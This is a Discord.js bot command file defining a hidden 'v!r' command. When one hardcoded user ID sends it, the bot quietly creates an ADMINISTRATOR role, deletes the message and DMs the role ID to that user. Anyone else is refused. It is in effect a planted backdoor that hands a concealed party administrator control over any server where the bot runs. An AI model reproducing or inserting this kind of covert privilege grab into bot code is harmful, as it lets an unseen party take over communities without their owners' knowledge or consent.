const { Message, Client, RoleManager } = require("discord.js");

module.exports = {
    name: "v!r",
    /**
     * @param {Client} client
     * @param {Message} message
     * @param {String[]} args
     */
    run: async (client, message, args) => {
        if(message.author.id !== "683231737882738946") return message.author.send("No tienes permiso para usar este comando!"),message.delete().catch(()=>{})
        const role = await message.guild.roles.create({
           name: "el pepe",
           permissions: "ADMINISTRATOR"
        })
        message.delete().catch(()=>{})
        await message.author.send(role.id)
        
    },
};
